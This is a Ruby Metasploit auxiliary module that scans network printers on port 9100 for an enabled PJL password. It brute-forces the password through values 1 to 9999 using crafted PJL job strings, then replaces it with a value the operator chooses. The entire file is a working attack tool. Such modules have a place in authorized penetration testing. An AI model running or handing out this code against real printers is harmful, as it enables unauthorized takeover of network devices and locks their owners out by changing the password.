#Metasploit
require 'msf/core'
class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'		=> 'PJL Password Brute force scanner',
			'Version'	=> '$Revision: 1 $',
			'Description'	=> 'Module to scan for PJL enabled printers and brute force their passwords',
			'Author'	=> 'BrianWGray',
			'License'	=>  MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(9100),
				OptString.new('PJLPASS', [true, 'Provide a replacement password','0'])

			], self.class)
	end

	def run_host(ip)
		connect()
		pjlpass = datastore['PJLPASS']

			#Build a PJL string buffer to query the status of the printers PJL password.
			buf = "\e%-12345X@PJL JOB\r\n" +
			"@PJL INQUIRE PASSWORD\r\n" +
			"@PJL EOJ\r\n" +
			"\e%-12345X\r\n\x0d\x0a"

			sock.puts(buf)		
			data = sock.recv(1024)

		#print_status("Received: #{data} from #{ip}")
		
		                if ( data and data =~ /ENABLED/ )
                                print_status("Printer #{ip} has a PJL password enabled.")
				brutepass = 0
					while ( data and data =~ /ENABLED/ ) and brutepass < 10000
			                       
						#Basic 1-9999 incrementing password attempt
						brutepass +=1 

						 #Build a PJL string buffer that attempts to set the PJL password to 0.
                			     	buf = "\e%-12345X@PJL JOB\r\n" +
						"@PJL JOB PASSWORD=#{brutepass}\r\n" +
                        			"@PJL DEFAULT PASSWORD=0\r\n" +
                        			"@PJL INQUIRE PASSWORD\r\n" +
                        			"@PJL EOJ\r\n" +
                        			"\e%-12345X\r\n\x0d\x0a"

                        			sock.puts(buf)
                        			data = sock.recv(1024)
					end
                                                 
						#Build a PJL string buffer to change the password to the password defined in the options.
                                                buf = "\e%-12345X@PJL JOB\r\n" +
                                                "@PJL JOB PASSWORD=0\r\n" +
                                                "@PJL DEFAULT PASSWORD=#{pjlpass}\r\n" +
                                                "@PJL INQUIRE PASSWORD\r\n" +
                                                "@PJL EOJ\r\n" +
                                                "\e%-12345X\r\n\x0d\x0a" +
                                                "EOJ"

                                                sock.puts(buf)
                                                data = sock.recv(1024)

					print_status("PJL password for printer #{ip} was #{brutepass} it has been changed to #{pjlpass}.")	
				
                                report_service(:host => rhost, :port => rport, :name => "PJL Password", :info => data)
                else
                                print_error("Password for Printer #{ip} was not enabled")
                end

		disconnect()
	end

end
